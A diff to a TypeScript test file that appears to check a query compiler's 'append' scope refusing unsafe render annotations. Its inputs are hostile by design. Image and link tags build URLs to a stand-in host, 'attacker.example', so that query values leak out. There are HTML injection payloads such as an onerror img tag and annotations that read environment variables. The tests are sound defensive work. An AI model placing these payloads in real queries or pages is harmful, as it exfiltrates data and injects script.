@@ -406,32 +406,84 @@ source: published is duckdb.sql("select 1 as id") extend {
 
    describe('scope "append" refuses render tags that make a value a URL', () => {
       const LEAK = "https://attacker.example/p?d=";
-      const forms: Record<string, string> = {
-         "# image on a dimension": `source: leaky is base_source extend {\n  dimension: # image\n    pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
-         "# image inline before the field name": `source: leaky is base_source extend { dimension: # image pic is concat('${LEAK}', 'x') }\nrun: leaky -> { group_by: pic }`,
-         "# image on a query's output field": `run: base_source -> { group_by: # image pic is concat('${LEAK}', 'x') }`,
-         "# link with a url_template": `run: base_source -> { group_by: # link { url_template="${LEAK}$$" } name is 'x' }`,
-         "# link on a view": `source: leaky is base_source extend {\n  # link\n  view: v is { group_by: id }\n}\nrun: leaky -> v`,
-         "# image under another tag": `run: base_source -> { group_by: # column { image } pic is 'x' }`,
-         "an image tag with options": `run: base_source -> { group_by: # image { height=40px } pic is 'x' }`,
-         "HTML in a # label": `run: base_source -> { group_by: # label="<img src=x onerror=alert(1)>" id }`,
-         "a backtick-quoted image tag": `run: base_source -> { group_by:\n  # \`image\`\n  pic is concat('${LEAK}', 'x')\n}`,
-         "a backtick-quoted link tag": `run: base_source -> { group_by:\n  # \`link\` { url_template="${LEAK}$$" }\n  name is 'x'\n}`,
-         "a quoted image tag": `run: base_source -> { group_by: # "image" pic is 'x' }`,
-         "an image tag in a #| block": `run: base_source -> { group_by:\n#|\nimage\n|#\npic is concat('${LEAK}', 'x')\n}`,
-         "a link tag in a #| block": `run: base_source -> { group_by:\n#|\nlink { url_template="${LEAK}$$" }\n|#\nname is 'x'\n}`,
-         "an image tag after other tags in one line": `run: base_source -> { group_by: # label="P" hidden image pic is 'x' }`,
-         "a label with an escaped quote ahead of the markup": `run: base_source -> { group_by: # label="a\\"<img src=x>" id }`,
-         "a label with a unicode escape for <": `run: base_source -> { group_by: # label="\\u003cimg src=x>" id }`,
-         "a single-quoted label with markup": `run: base_source -> { group_by: # label='<b>x</b>' id }`,
-         "an image tag nested in a viz tag's array": `run: base_source -> { group_by: # bar_chart { series = [ { image } ] } pic is 'x' }`,
+      // An annotation runs to the end of its line, so each sits on its own.
+      const grp = (annotation: string, field = "pic is 'x'") =>
+         `run: base_source -> {\n  group_by:\n${annotation}\n  ${field}\n}`;
+      const RENDER = "render tag";
+      const HTML = "HTML in a";
+      const forms: Record<string, [string, string]> = {
+         "# image on a dimension": [
+            `source: leaky is base_source extend {\n  dimension: # image\n    pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
+            RENDER,
+         ],
+         "# image inline before the field name": [
+            `source: leaky is base_source extend {\n  dimension:\n  # image\n  pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
+            RENDER,
+         ],
+         "# image on a query's output field": [grp("  # image"), RENDER],
+         "# link with a url_template": [
+            grp(`  # link { url_template="${LEAK}$$" }`),
+            RENDER,
+         ],
+         "# link on a view": [
+            `source: leaky is base_source extend {\n  # link\n  view: v is { group_by: id }\n}\nrun: leaky -> v`,
+            RENDER,
+         ],
+         "# image under another tag": [grp("  # column { image }"), RENDER],
+         "an image tag with options": [
+            grp("  # image { height=40px }"),
+            RENDER,
+         ],
+         "HTML in a # label": [
+            grp('  # label="<img src=x onerror=alert(1)>"'),
+            HTML,
+         ],
+         "a backtick-quoted image tag": [grp("  # `image`"), RENDER],
+         "a backtick-quoted link tag": [
+            grp(`  # \`link\` { url_template="${LEAK}$$" }`),
+            RENDER,
+         ],
+         "a quoted image tag (which MOTLY rejects, so it fails closed)": [
+            grp('  # "image"'),
+            "does not parse",
+         ],
+         "an image tag in a #| block": [
+            `run: base_source -> {\n  group_by:\n#|\nimage\n|#\n  pic is concat('${LEAK}', 'x')\n}`,
+            RENDER,
+         ],
+         "a link tag in a #| block": [
+            `run: base_source -> {\n  group_by:\n#|\nlink { url_template="${LEAK}$$" }\n|#\n  pic is 'x'\n}`,
+            RENDER,
+         ],
+         "an image tag after other tags in one line": [
+            grp('  # label="P" hidden image'),
+            RENDER,
+         ],
+         "a label with an escaped quote ahead of the markup": [
+            grp('  # label="a\\"<img src=x>"'),
+            HTML,
+         ],
+         "a label with a unicode escape for <": [
+            grp('  # label="\\u003cimg src=x>"'),
+            HTML,
+         ],
+         "a single-quoted label with markup": [
+            grp("  # label='<b>x</b>'"),
+            HTML,
+         ],
+         "an image tag nested in a viz tag's array": [
+            grp("  # bar_chart { series = [ { image } ] }"),
+            RENDER,
+         ],
       };
 
-      for (const [name, source] of Object.entries(forms)) {
+      for (const [name, [source, message]] of Object.entries(forms)) {
          it(`refuses ${name}, before anything compiles`, async () => {
             const error = await refusalFor(source, "append");
             expect(error).toBeInstanceOf(CompileRefusedError);
             expect(error.message).toContain('scope "append"');
+            // The unparseable-text refusal also names the scope, so it must be this gate that spoke.
+            expect(error.message).toContain(message);
          });
       }
 
@@ -439,7 +491,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          const answer = async (field: string) =>
             (
                await refusalFor(
-                  `run: base_source -> { group_by: # image pic is concat('${LEAK}', ${field}) }`,
+                  grp("  # image", `pic is concat('${LEAK}', ${field})`),
                   "append",
                )
             ).message;
@@ -447,10 +499,78 @@ source: published is duckdb.sql("select 1 as id") extend {
       });
 
       it("is not fooled by an apostrophe in a prose block ahead of the tag", async () => {
-         await refusalFor(
-            `##|(markdown) intro\ndon't stop\n|##\nrun: base_source -> { group_by: # image pic is 'x' }`,
+         const error = await refusalFor(
+            `##|(markdown) intro\ndon't stop\n|##\n${grp("  # image")}`,
             "append",
          );
+         expect(error.message).toContain(RENDER);
+      });
+
+      describe("an annotation that reads the environment, does not parse, or is too long", () => {
+         const unsafe: Record<string, [string, string]> = {
+            "an image tag valued from @env.": [
+               grp("  # image=@env.HOME"),
+               "@env.",
+            ],
+            "an image tag with an @env. property": [
+               grp("  # image { alt=@env.HOME }"),
+               "@env.",
+            ],
+            "a link tag with an @env. template": [
+               grp("  # link { url_template=@env.X }"),
+               "@env.",
+            ],
+            "an @env. value in a #| block": [
+               `run: base_source -> {\n  group_by:\n#|\nimage=@env.X\n|#\n  pic is 'x'\n}`,
+               "@env.",
+            ],
+            "markup in a label beside an @env. value": [
+               grp('  # label="<img src=x>" x=@env.X'),
+               "@env.",
+            ],
+            "an unclosed tag the renderer may read differently": [
+               grp("  # image {"),
+               "does not parse",
+            ],
+            "an annotation past the length bound": [
+               grp(`  # label="${"a".repeat(9000)}"`),
+               "exceeds",
+            ],
+         };
+         for (const [name, [source, message]] of Object.entries(unsafe)) {
+            it(`refuses ${name}`, async () => {
+               const error = await refusalFor(source, "append");
+               expect(error).toBeInstanceOf(CompileRefusedError);
+               expect(error.message).toContain(message);
+            });
+         }
+      });
+
+      describe("a column excepted and declared again", () => {
+         const shadow: Record<string, string> = {
+            "a dimension in the same extend": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "a measure": `source: s2 is base_source extend {\n  except: c\n  measure: c is count()\n}\nrun: s2 -> { aggregate: c }`,
+            "a join": `source: s2 is base_source extend {\n  except: j\n  join_one: j is base_source on j.id = id\n}\nrun: s2 -> { group_by: id }`,
+            "a rename target": `source: s2 is base_source extend {\n  except: a\n  rename: a is id\n}\nrun: s2 -> { group_by: a }`,
+            "an inline extend inside a query": `run: base_source extend {\n  except: id\n  dimension: id is 'x'\n} -> { group_by: id }`,
+            "a backtick-quoted name": `source: s2 is base_source extend {\n  except: \`my col\`\n  dimension: \`my col\` is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "a name declared in a later statement": `source: s2 is base_source extend { except: id }\nsource: s3 is s2 extend {\n  dimension: id is 'x'\n}\nrun: s3 -> { group_by: id }`,
+         };
+         for (const [name, source] of Object.entries(shadow)) {
+            it(`refuses ${name}`, async () => {
+               const error = await refusalFor(source, "append");
+               expect(error).toBeInstanceOf(CompileRefusedError);
+               expect(error.message).toContain("excepts and then declares");
+            });
+         }
+
+         it("still accepts an except: that declares nothing of the same name", async () => {
+            const errors = await errorsFor(
+               `source: s2 is base_source extend {\n  except: id\n  dimension: label is 'x'\n}\nrun: s2 -> { aggregate: c }`,
+               "append",
+            );
+            expect(errors).toEqual([]);
+         });
       });
 
       const accepted: Record<string, string> = {
